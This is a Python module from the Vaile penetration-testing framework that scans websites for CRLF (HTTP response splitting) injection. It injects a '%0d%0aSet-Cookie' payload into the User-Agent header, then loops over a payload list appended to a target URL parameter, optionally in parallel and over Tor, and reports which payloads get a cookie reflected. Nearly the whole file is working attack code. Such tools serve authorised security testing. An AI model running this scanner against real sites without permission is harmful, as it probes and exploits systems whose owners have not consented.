#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    Vaile Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID_
#This module requires Vaile Framework
#https://github.com/VainlyStrain/Vaile


import os
import sys
import urllib.request
import urllib3
import requests as wrn
import time
from core.methods.tor import session
from multiprocessing import Pool, TimeoutError
from core.methods.multiproc import listsplit
from core.variables import processes
from core.Core.colors import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
wrn.packages.urllib3.disable_warnings(InsecureRequestWarning)

payloads = []

info = "CRLF Injection module."
searchinfo = "CRLF Injection module"
properties = {}

def check0x00(headers, pay):
    success = []
    vuln = False
    try:
        print(O+' [!] Headers obtained...')
        time.sleep(0.6)
        print(GR+' [*] Initiating response check...')
        for head in headers:

            if 'Set-Cookie'.lower() in head.lower():
                print(G+' [+] Found Cookie Reflection Value...')
                time.sleep(0.5)
                print(O+' [*] Checking cookie response...')
                time.sleep(0.8)
                if headers['Set-Cookie'].lower() == 'Infected_by=Drake'.lower():
                    vuln = True
                    success.append(pay)
                else:
                    vuln = False

        if vuln == True:
            print(G+' [+] CRLF Injection Successful!')
            print(O+' [+] Found Cookie Response Reflection : '+C+'Infected_by=Drake\n')
        elif vuln == False:
            print(R+' [-] Payload '+O+pay+R+' unsuccessful!')
            print(R+' [-] No Response Header Splitting...\n')
        else:
            print(R+' [-] Fuck! Something really went bad...')

    except Exception as e:
        print(R+' [-] Exception encountered!')
        print(R+' [-] Error : '+str(e))

    return success

def getHeaders0x00(web0x00, headers):

    try:
        requests = session()
        wrn.packages.urllib3.disable_warnings(InsecureRequestWarning)
        print(GR+' [*] Requesting headers...')
        r = requests.get(web0x00, headers=headers, timeout=7, verify=False)
        head = r.headers
        return head
    except Exception as e:
        print(R+' [-] Unexpected Exception Encountered!')
        print(R+' [-] Exception : '+str(e))

def getFile0x00():

    try:
        print(GR+' [*] Importing filepath...')
        print(O+' [#] Enter path to file (default: files/payload-db/crlf_payloads.lst)...')
        w = input(O+' [#] Your input (Press Enter if default) :> ')
        if w == '':
            fi = 'files/payload-db/crlf_payloads.lst'
            print(GR+' [*] Importing payloads...')
            with open(fi, 'r') as q0:
                for q in q0:
                    q = q.strip('\n')
                    payloads.append(q)

        else:
            fi = w
            if os.path.exists(fi):
                print(G+' [+] File '+fi+' found...')
                print(GR+' [*] Importing payloads...')
                with open(fi, 'r') as q0:
                    for q in q0:
                        q = q.strip('\n')
                        payloads.append(q)
        return payloads

    except IOError:
        print(R+' [-] File path '+O+fi+' not found!')

def checkpre(payloads, web00, gen_headers):
    success = []
    for pay in payloads:
        web0x00 = web00 + pay
        print(C+' [+] Using payload : '+B+str(pay))
        print(B+' [+] Using !nfected Url : '+GR+str(web0x00))
        p = getHeaders0x00(web0x00, gen_headers)
        success += check0x00(p, pay)
    return success

def crlf(web):

    print(GR+' [*] Loading module...')
    time.sleep(0.5)
    #print(R+'\n    =============================')
    #print(R+'\n     C R L F   I N J E C T I O N')
    #print(R+'    ——·‹›·––·‹›·——·‹›·——·‹›·––·‹›\n')
    from core.methods.print import pvln
    pvln("CRLF Injection")             

    gen_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
                      'Accept-Language':'en-US;',
                      'Accept-Encoding': 'gzip, deflate',
                      'Accept': 'text/html,application/xhtml+xml,application/xml;',
                      'Connection':'close'}
    inf_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201%0d%0aSet-Cookie: Infected_by=Drake',
                      'Accept-Language':'en-US;',
                      'Accept-Encoding': 'gzip, deflate',
                      'Accept': 'text/html,application/xhtml+xml,application/xml;',
                      'Connection':'close'}
    print(GR+' [*] Testing response to normal requests...')
    time.sleep(0.5)
    print(O+' [*] Setting header values...')
    time.sleep(0.7)

    print(O+' [*] Initiating '+R+'User-Agent Based Check...')
    time.sleep(0.5)
    print(B+' [+] Injecting CRLF in User-Agent Based value : '+C+'%0d%0a ...')
    time.sleep(0.7)

    print(O+' [*] Using !nfected UA Value : '+inf_headers['User-Agent'])
    m = getHeaders0x00(web, inf_headers)
    success = []
    success += check0x00(m, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201%0d%0aSet-Cookie: Infected_by=Drake')
    print(GR+' [*] Initiating '+R+'Parameter Based Check...')
    param = input(O+' [#] Scope parameter (eg. /vuln/page.php?crlf=x) :> ')
    if not param.startswith('/'):
        param = '/' + param

    pa = input("\n [?] Parallelise Attack? (enter if not) :> ")
    parallel = pa is not ""

    e = getFile0x00()
    web0 = web + param
    web00 = web0.split('=')[0] + '='
    try:
        if not parallel:
            for pay in payloads:
                web0x00 = web00 + pay
                print(C+' [+] Using payload : '+B+str(pay))
                print(B+' [+] Using !nfected Url : '+GR+str(web0x00))
                p = getHeaders0x00(web0x00, gen_headers)
                success += check0x00(p, pay)
        else:
            paylists = listsplit(payloads, round(len(payloads)/processes))
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(checkpre, args=(l, web00, gen_headers,)) for l in paylists]
                for y in res:
                    i = y.get()
                    success += i
        if success:
            print(" [+] CRLF Injection Vulnerability found! Successful payloads:")
            for i in success:
                print(i)
        else:
            print(R + "\n [-] No payload succeeded."+C)
    except Exception as e:
        print(R+' [-] Unexpected Exception Encountered!')
        print(R+' [-] Exception : '+str(e))
    print(G+' [+] CRLF Module Completed!')

def attack(web):
    crlf(web)